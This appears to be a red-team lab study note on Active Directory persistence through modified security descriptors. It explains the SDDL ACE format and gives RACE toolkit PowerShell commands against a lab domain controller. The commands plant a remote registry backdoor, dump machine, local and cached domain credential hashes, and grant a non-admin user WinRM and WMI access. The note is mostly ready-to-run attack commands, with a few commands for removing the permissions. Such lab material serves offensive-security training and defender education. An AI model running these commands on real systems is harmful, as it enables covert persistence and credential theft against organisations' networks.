It's possible to modify Security Descriptors (security information like
Owner, primary group, DACL and SACL) of multiple remote access
methods (securable objects) to allow access to non-admin users.

Administrative privileges are required for this, however it is a very impactful backdoor mechanism

> [!NOTE] **NOTE**
> Security Descriptor Definition Language Format:
> `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid`
> 
> ACE for built-in administrators for WMI namespaces:
> `A;CI;CCDCLCSWRPWPRCWD;;;SID`
> 
> We're interested in simply changing the SID to a user we control

### RACE
ACLs can be modified to allow non-admin users access to securable objects. Using the RACE toolkit:

```powershell
. .\Race.ps1
```

##### Remote Registry (machine hash backdoor)
Using RACE or DAMP, with admin privs on remote machine
```powershell
Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee student548 -Verbose
```

As student548, retrieve machine account hash
```powershell
Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
```

Retrieve local account hash
```powershell
Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
```

Retrieve domain cached credentials
```powershell
Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
```

##### WinRM
On a local machine
```powershell
Set-RemotePSRemoting -SamAccountName student548 -Verbose
```

On a remote machine for user `student548` **without** explicit credentials
```powershell
Set-RemotePSRemoting -SamAccountName student548 -ComputerName dcorp-dc -Verbose
```

Test
```powershell
Enter-PSSession -computername dcorp-dc
```

Removing permissions
```powershell
Set-RemotePSRemoting -SamAccountName student548 -ComputerName dcorp-dc -Remove
```


> [!NOTE] **NOTE**
> Permissions within the WinRM will be the same as a regular user but that doesn't mean we cant Priv Esc on the machine

##### WMI
On a local machine
```powershell
Set-RemoteWMI -SamAccountName student548 -Verbose
```

On a remote machine for user `student548` **without** explicit credentials
```powershell
Set-RemoteWMI -SamAccountName student548 -ComputerName dcorp-dc -namespace 'root\cimv2' -Verbose
```

Removing permissions
```powershell
Set-RemoteWMI -SamAccountName student548 -ComputerName dcorp-dc-namespace 'root\cimv2' -Remove -Verbose
```

Test with `gwmi`
```powershell
gwmi -class win32_operatingsystem -ComputerName dcorp-dc
```